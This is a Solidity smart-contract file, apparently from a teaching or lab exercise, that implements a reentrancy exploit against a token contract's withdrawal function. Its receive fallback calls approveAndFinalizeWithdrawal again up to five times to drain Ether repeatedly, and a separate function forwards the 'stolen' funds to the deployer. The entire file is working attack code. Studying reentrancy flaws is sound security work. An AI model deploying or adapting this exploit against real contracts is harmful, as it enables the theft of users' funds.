// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

/**
 * @title ITokenWithVulnerability
 * @dev Interface for the target token contract, specifically exposing the
 * function vulnerable to reentrancy for demonstration purposes.
 * This interface should match the relevant function signature in CampusCreditToken.
 */
interface ITokenWithVulnerability {
    function approveAndFinalizeWithdrawal(uint256 _requestId) external;
}

/**
 * @title ReentrancyExploiter
 * @dev This contract is designed to demonstrate a reentrancy attack
 * against a target token contract that has a vulnerability in its
 * withdrawal mechanism. It repeatedly calls the vulnerable function
 * from its `receive` fallback until a certain depth is reached.
 */
contract ReentrancyExploiter {
    // Immutable reference to the target token contract.
    ITokenWithVulnerability public immutable targetToken;
    // The address of the attacker (contract deployer).
    address public immutable attackerAddress;

    // Tracks the number of re-entrant calls made.
    uint public reentrancyCallCount = 0;
    // Stores the request ID targeted by the current attack.
    uint256 public activeRequestId;

    /**
     * @dev Constructor to initialize the exploiter contract.
     * @param _targetTokenAddress The address of the vulnerable token contract.
     */
    constructor(address _targetTokenAddress) {
        targetToken = ITokenWithVulnerability(_targetTokenAddress);
        attackerAddress = msg.sender; // The deployer is the attacker
    }

    /**
     * @dev Initiates the reentrancy attack on a specific withdrawal request.
     * Only the contract deployer (attacker) can start this.
     * @param _requestId The ID of the withdrawal request on the target token contract to exploit.
     */
    function initiateReentrancyAttack(uint256 _requestId) external {
        require(msg.sender == attackerAddress, "ReentrancyExploiter: Only the attacker can initiate");

        // Reset call count and set the target request ID for the current attack
        activeRequestId = _requestId;
        reentrancyCallCount = 0;

        // Make the first call to trigger the reentrancy
        targetToken.approveAndFinalizeWithdrawal(_requestId);
    }

    /**
     * @dev Fallback function, executed when Ether is sent to this contract.
     * This is the core of the reentrancy logic, making recursive calls.
     * It will attempt to call the vulnerable function again if the reentrancy
     * depth is below a certain threshold (e.g., 5 calls).
     */
    receive() external payable {
        reentrancyCallCount++; // Increment the re-entry counter

        // Continue the re-entrant call if the count is below a threshold
        // This prevents infinite loops and potential out-of-gas errors in a real scenario.
        if (reentrancyCallCount < 5) { // Limiting the re-entry depth for demonstration
            targetToken.approveAndFinalizeWithdrawal(activeRequestId);
        }
    }

    /**
     * @dev Allows the attacker to withdraw any Ether stolen by this contract.
     * Only the contract deployer (attacker) can call this.
     */
    function recoverStolenEther() external {
        require(msg.sender == attackerAddress, "ReentrancyExploiter: Only attacker can recover funds");
        // Transfer all Ether held by this contract to the attacker's address
        (bool success, ) = payable(attackerAddress).call{value: address(this).balance}("");
        require(success, "ReentrancyExploiter: Failed to recover stolen funds");
    }
}
